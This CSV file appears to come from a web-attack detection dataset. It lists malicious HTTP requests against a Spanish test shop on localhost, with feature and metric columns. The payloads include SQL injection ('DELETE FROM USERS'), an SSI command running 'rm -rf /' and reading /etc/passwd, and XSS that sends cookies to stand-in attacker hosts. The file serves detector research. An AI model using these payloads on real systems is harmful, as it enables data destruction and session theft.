request_id,url,payload,detected_language,is_unsafe,payload_length,num_special_chars,url_depth,lang_match,precision_m1,recall_m1,fpr_m1,fnr_m1
f405a185,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Pasar+por+caja,,1,209,0,5,0,100.0,100.0,-99.0,-99.0
bc9090f8,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=%27+DELETE+FROM+USERS&precio=39&cantidad=63&B1=A%F1adir+al+carrito,,1,78,0,5,0,100.0,100.0,-99.0,-99.0
15f906cb,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Queso+Manchego&precio=%27+DELETE+FROM+USERS&cantidad=18&B1=A%F1adir+al+carrito,,1,90,0,5,0,100.0,100.0,-99.0,-99.0
12f32ada,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1%27+DELETE+FROM+USERS,,1,25,0,5,0,100.0,100.0,-99.0,-99.0
14dc7350,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&B1=Pasar+por+caja,,1,105,0,5,0,100.0,100.0,-99.0,-99.0
13c002b8,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=%22+AND+%221%22%3D%221&B1=Pasar+por+caja,,1,61,0,5,0,100.0,100.0,-99.0,-99.0
7b02e47f,http://localhost:8080/tienda1/publico/registro.jsp,modo=%27+DELETE+FROM+USERS&login=terrye&password=lombriguera&nombre=Policarpa&apellidos=Susanibar+Nolla&email=kortner%40vitalhome.cl&dni=40604241H&direccion=Avda.+Del+Municipi%2C+45%2C+&ciudad=Arona&cp=19144&provincia=M%E1laga&ntc=4253633913747340&B1=Registrar,,1,260,0,5,0,100.0,100.0,-99.0,-99.0
bd9c8bdf,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
bd9c8bdf,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
4fd29b3a,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=plsntp1&password=c%21uartilludo&nombre=Generosa&apellidos=Obrador+Scolari&email=metanee4%40martosfutbolsala.us&dni=55023331V&direccion=Cuesta+De+La+Independencia+107+7%3FH&ciudad=Bastida%2C+La&cp=50268&provincia=Guadalajara&ntc=7559315491846404sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Registrar,,1,447,0,5,0,100.0,100.0,-99.0,-99.0
672ac4d5,http://localhost:8080/tienda1/publico/pagar.jsp,modo=%22+AND+%221%22%3D%221&precio=7061&B1=Pasar+por+caja,,1,57,0,5,0,100.0,100.0,-99.0,-99.0
60715a1c,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
ce75b619,http://localhost:8080/tienda1/publico/pagar.jsp,modo=%27+DELETE+FROM+USERS&precio=806&B1=Confirmar,,1,50,0,5,0,100.0,100.0,-99.0,-99.0
60715a1c,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=%27+DELETE+FROM+USERS,,1,24,0,5,0,100.0,100.0,-99.0,-99.0
e35029f6,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=crickard&pwd=%27+DELETE+FROM+USERS&remember=off&B1=Entrar,,1,75,0,5,0,100.0,100.0,-99.0,-99.0
bd9c8bdf,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
37756abc,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=hamilton&password=178gaTorIO&nombre=%27+DELETE+FROM+USERS&apellidos=Maquieira+San+Segundo&email=glaessner-alwood%40softwaremasservicio.ic&dni=29189199Z&direccion=Redonda%2C+142%2C+13-G&ciudad=R%E1bade&cp=08673&provincia=Le%F3n&ntc=7739977532136253&B1=Registrar,,1,280,0,5,0,100.0,100.0,-99.0,-99.0
1bd45276,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2%27+DELETE+FROM+USERS,,1,25,0,5,0,100.0,100.0,-99.0,-99.0
1bd45276,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2%27+DELETE+FROM+USERS,,1,25,0,5,0,100.0,100.0,-99.0,-99.0
a9e48424,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=%27+DELETE+FROM+USERS&precio=39&cantidad=74&B1=A%F1adir+al+carrito,,1,78,0,5,0,100.0,100.0,-99.0,-99.0
bd9c8bdf,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=%27+DELETE+FROM+USERS,,1,30,0,5,0,100.0,100.0,-99.0,-99.0
f41fd1e9,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=nataniel&password=53rD11c4&nombre=Ligia&apellidos=Klindt+Vanega&email=cordon4%40hojainformativas.je&dni=96785368B&direccion=Pintor+Clemente+De+Torres+169+&ciudad=%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E&cp=09125&provincia=Guadalajara&ntc=2447487443590870&B1=Registrar,,1,313,0,5,0,100.0,100.0,-99.0,-99.0
1bd45276,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=2%27+DELETE+FROM+USERS,,1,25,0,5,0,100.0,100.0,-99.0,-99.0
cdf1e760,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%27+DELETE+FROM+USERS,,1,38,0,5,0,100.0,100.0,-99.0,-99.0
125e88da,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=shari&pwd=AGobiadO&remember=on&B1=Entrar%27+DELETE+FROM+USERS,,1,79,0,5,0,100.0,100.0,-99.0,-99.0
30422c37,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,567,0,5,0,100.0,100.0,-99.0,-99.0
48c57fe7,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=crickard&password=chofe&nombre=Irene&apellidos=Blancas+Sol%F3rzano&email=billingsley%40yksoluap.sr&dni=44614622G&direccion=Gibraltar%2C+160+&ciudad=Cogollos&cp=10189&provincia=Cuenca&ntc=2593497468791354%27+DELETE+FROM+USERS&B1=Registrar,,1,257,0,5,0,100.0,100.0,-99.0,-99.0
927f5371,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar%27+AND+%271%27%3D%271&precio=8804&B1=Pasar+por+caja,,1,65,0,5,0,100.0,100.0,-99.0,-99.0
b257a79c,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS,,1,54,0,5,0,100.0,100.0,-99.0,-99.0
30422c37,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,567,0,5,0,100.0,100.0,-99.0,-99.0
ca461d72,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=65&B1=A%F1adir+al+carrito%27+DELETE+FROM+USERS,,1,95,0,5,0,100.0,100.0,-99.0,-99.0
30422c37,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,567,0,5,0,100.0,100.0,-99.0,-99.0
30422c37,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,567,0,5,0,100.0,100.0,-99.0,-99.0
a277a00d,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=cupid&pwd=ar9ada&remember=on%27+DELETE+FROM+USERS&B1=Entrar,,1,77,0,5,0,100.0,100.0,-99.0,-99.0
88e0d6da,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=9611&B1=Confirmar%27+DELETE+FROM+USERS,,1,59,0,5,0,100.0,100.0,-99.0,-99.0
3fd9b929,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro%27+DELETE+FROM+USERS&login=messier&password=c7b183o&nombre=Nicodemo&apellidos=Triola+Villuend&email=galloway%40rtce.gu&dni=35507822P&direccion=Numero+15%2C+151%2C+&ciudad=Castrillo+de+la+Guare%F1a&cp=23657&provincia=Toledo&ntc=1278501676319264&B1=Registrar,,1,270,0,5,0,100.0,100.0,-99.0,-99.0
b9a4fca5,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=natraj&pwd=desa1a0car%27+DELETE+FROM+USERS&remember=on&B1=Entrar,,1,82,0,5,0,100.0,100.0,-99.0,-99.0
30422c37,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,567,0,5,0,100.0,100.0,-99.0,-99.0
8235009f,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=87%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito,,1,96,0,5,0,100.0,100.0,-99.0,-99.0
30422c37,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,567,0,5,0,100.0,100.0,-99.0,-99.0
8847fa70,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=abacus6%27+DELETE+FROM+USERS&pwd=m8n71leta&remember=on&B1=Entrar,,1,82,0,5,0,100.0,100.0,-99.0,-99.0
30422c37,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,567,0,5,0,100.0,100.0,-99.0,-99.0
0a64d0eb,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar%27+DELETE+FROM+USERS&precio=4981&B1=Confirmar,,1,59,0,5,0,100.0,100.0,-99.0,-99.0
cd042256,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Queso+Manchego&precio=39&cantidad=65%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito,,1,92,0,5,0,100.0,100.0,-99.0,-99.0
01cc7e9a,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=briana&password=1es8r59z6%27+DELETE+FROM+USERS&nombre=Mayid&apellidos=Pareja&email=eggerikx%40intercambiodeenlaces.gl&dni=72999469E&direccion=C%2F+Hipodromo+De+Pineda%2C+123%2C+11-G&ciudad=Cinco+Olivas&cp=42169&provincia=La+Rioja&ntc=1600482599299219&B1=Registrar,,1,283,0,5,0,100.0,100.0,-99.0,-99.0
2b1c450b,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=2361%22+AND+%221%22%3D%221&B1=Pasar+por+caja,,1,65,0,5,0,100.0,100.0,-99.0,-99.0
b257a79c,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS,,1,54,0,5,0,100.0,100.0,-99.0,-99.0
30422c37,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,567,0,5,0,100.0,100.0,-99.0,-99.0
b4afe68c,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,568,0,5,0,100.0,100.0,-99.0,-99.0
30422c37,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,567,0,5,0,100.0,100.0,-99.0,-99.0
a47686f9,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=8496&B1=Pasar+por+caja%22+AND+%221%22%3D%221,,1,65,0,5,0,100.0,100.0,-99.0,-99.0
3435dec5,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=yale&pwd=2NcOJa7&remember=on%27+DELETE+FROM+USERS&B1=Entrar,,1,77,0,5,0,100.0,100.0,-99.0,-99.0
a0a86ede,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=60%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito,,1,95,0,5,0,100.0,100.0,-99.0,-99.0
30422c37,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,567,0,5,0,100.0,100.0,-99.0,-99.0
b4afe68c,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,568,0,5,0,100.0,100.0,-99.0,-99.0
b4afe68c,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,568,0,5,0,100.0,100.0,-99.0,-99.0
4dd5a693,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar%22+AND+%221%22%3D%221&precio=7495&B1=Pasar+por+caja,,1,65,0,5,0,100.0,100.0,-99.0,-99.0
86a21556,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Vino+Rioja&precio=39&cantidad=70%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito,,1,88,0,5,0,100.0,100.0,-99.0,-99.0
21ebe5a5,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar&precio=7105%22+AND+%221%22%3D%221&B1=Pasar+por+caja,,1,65,0,5,0,100.0,100.0,-99.0,-99.0
7013d4de,http://localhost:8080/tienda1/publico/anadir.jsp,id=3&nombre=Queso+Manchego&precio=39&cantidad=88%27+DELETE+FROM+USERS&B1=A%F1adir+al+carrito,,1,92,0,5,0,100.0,100.0,-99.0,-99.0
dde87d40,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=robena1&password=improvisaci%F3n&nombre=Reinoldo&apellidos=Gelabert&email=oland5%40schnaps.com.by&dni=51756068L&direccion=C%2F+Santa+Escolastica+178%2C+&ciudad=Quintanilla+de+Arriba&cp=35543%27+DELETE+FROM+USERS&provincia=Huesca&ntc=7852557135021483&B1=Registrar,,1,282,0,5,0,100.0,100.0,-99.0,-99.0
7375ad69,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar%27+DELETE+FROM+USERS&login=joannidi&pwd=mis9tura&remember=off&B1=Entrar,,1,83,0,5,0,100.0,100.0,-99.0,-99.0
ca9c1d7b,http://localhost:8080/tienda1/publico/anadir.jsp,id=2&nombre=Queso+Manchego&precio=85%27+DELETE+FROM+USERS&cantidad=1&B1=A%F1adir+al+carrito,,1,91,0,5,0,100.0,100.0,-99.0,-99.0
20cca804,http://localhost:8080/tienda1/publico/registro.jsp,modo=registro&login=mellisen&password=ATaCado&nombre=Sacha&apellidos=Guizasola+Curiel&email=templey%40sgi-sl.ps&dni=49723912M&direccion=Calle+Cardenal+Gardoqui+62%2C+&ciudad=Canal+de+Berd%FAn&cp=25125&provincia=Zamora&ntc=6206165534393585&B1=Registrar%27+DELETE+FROM+USERS,,1,272,0,5,0,100.0,100.0,-99.0,-99.0
242bd421,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=robbie&password=7nexor40ilidad&nombre=Milet&apellidos=Alles+Araujo&email=adix_adam%40easyviaggio.com.km&dni=56876585T&direccion=Calle+Juan+Montilla%2C+50+1-A&ciudad=Paterna&cp=45870%27+DELETE+FROM+USERS&provincia=Navarra&ntc=9173328900592385&B1=Registrar,,1,274,0,5,0,100.0,100.0,-99.0,-99.0
b4afe68c,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=1sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,568,0,5,0,100.0,100.0,-99.0,-99.0
b257a79c,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS,,1,54,0,5,0,100.0,100.0,-99.0,-99.0
2c6af4bc,http://localhost:8080/tienda1/publico/anadir.jsp,id=1&nombre=Jam%F3n+Ib%E9rico%27+DELETE+FROM+USERS&precio=85&cantidad=72&B1=A%F1adir+al+carrito,,1,95,0,5,0,100.0,100.0,-99.0,-99.0
b257a79c,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS,,1,54,0,5,0,100.0,100.0,-99.0,-99.0
b257a79c,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS,,1,54,0,5,0,100.0,100.0,-99.0,-99.0
6730f05a,http://localhost:8080/tienda1/publico/vaciar.jsp,B2=Vaciar+carrito%27+DELETE+FROM+USERS,,1,38,0,5,0,100.0,100.0,-99.0,-99.0
f99b49c7,http://localhost:8080/tienda1/publico/autenticar.jsp,modo=entrar&login=shari&pwd=AGobiadO&remember=on&B1=Entrar%27+DELETE+FROM+USERS,,1,79,0,5,0,100.0,100.0,-99.0,-99.0
8d21c55d,http://localhost:8080/tienda1/publico/caracteristicas.jsp,id=sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F,,1,567,0,5,0,100.0,100.0,-99.0,-99.0
cbb84bf8,http://localhost:8080/tienda1/miembros/editar.jsp,modo=registro&login=crickard&password=chofe&nombre=Irene&apellidos=Blancas+Sol%F3rzano&email=billingsley%40yksoluap.sr&dni=44614622G&direccion=Gibraltar%2C+160+&ciudad=Cogollos&cp=10189&provincia=Cuenca&ntc=2593497468791354%27+DELETE+FROM+USERS&B1=Registrar,,1,257,0,5,0,100.0,100.0,-99.0,-99.0
8be56448,http://localhost:8080/tienda1/publico/pagar.jsp,modo=insertar%27+AND+%271%27%3D%271&precio=8804&B1=Pasar+por+caja,,1,65,0,5,0,100.0,100.0,-99.0,-99.0
c578a8d2,http://localhost:8080/tienda1/publico/entrar.jsp,errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS,,1,54,0,5,0,100.0,100.0,-99.0,-99.0
